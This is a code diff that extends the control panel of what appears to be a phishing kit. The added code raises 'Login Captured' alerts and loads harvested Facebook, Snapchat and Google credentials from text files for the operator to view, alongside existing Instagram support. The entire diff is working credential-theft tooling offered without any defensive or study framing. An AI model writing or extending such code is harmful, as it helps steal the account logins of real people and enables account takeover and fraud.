@@ -18,6 +18,18 @@ function Listener(){
             else if(data.includes("INSTAGRAM LOGIN CREDENTIALS")){
                 show_notif("Instagram Login Captured",data.slice(0, 200) + "...",true)
             }
+            
+            else if(data.includes("FACEBOOK LOGIN CREDENTIALS")){
+                show_notif("Facebook Login Captured",data.slice(0, 200) + "...",true)
+            }
+            
+            else if(data.includes("SNAPCHAT LOGIN CREDENTIALS")){
+                show_notif("Snapchat Login Captured",data.slice(0, 200) + "...",true)
+            }
+            
+            else if(data.includes("GOOGLE LOGIN CREDENTIALS")){
+                show_notif("Google Login Captured",data.slice(0, 200) + "...",true)
+            }
 
             
 
@@ -202,5 +214,50 @@ function viewInstagramCredentials() {
         }
     }).fail(function() {
         show_notif("Error", "Could not load Instagram credentials file", false);
+    });
+}
+
+// View Facebook credentials function
+function viewFacebookCredentials() {
+    $.get("facebook_credentials.txt", function(data) {
+        if(data.trim() !== "") {
+            $("#result").val(data);
+            old_data = data;
+            show_notif("Facebook Credentials Loaded", "Credentials displayed in result area", true);
+        } else {
+            show_notif("No Facebook Credentials", "No Facebook credentials have been captured yet", false);
+        }
+    }).fail(function() {
+        show_notif("Error", "Could not load Facebook credentials file", false);
+    });
+}
+
+// View Snapchat credentials function
+function viewSnapchatCredentials() {
+    $.get("snapchat_credentials.txt", function(data) {
+        if(data.trim() !== "") {
+            $("#result").val(data);
+            old_data = data;
+            show_notif("Snapchat Credentials Loaded", "Credentials displayed in result area", true);
+        } else {
+            show_notif("No Snapchat Credentials", "No Snapchat credentials have been captured yet", false);
+        }
+    }).fail(function() {
+        show_notif("Error", "Could not load Snapchat credentials file", false);
+    });
+}
+
+// View Google credentials function
+function viewGoogleCredentials() {
+    $.get("google_credentials.txt", function(data) {
+        if(data.trim() !== "") {
+            $("#result").val(data);
+            old_data = data;
+            show_notif("Google Credentials Loaded", "Credentials displayed in result area", true);
+        } else {
+            show_notif("No Google Credentials", "No Google credentials have been captured yet", false);
+        }
+    }).fail(function() {
+        show_notif("Error", "Could not load Google credentials file", false);
     });
 }
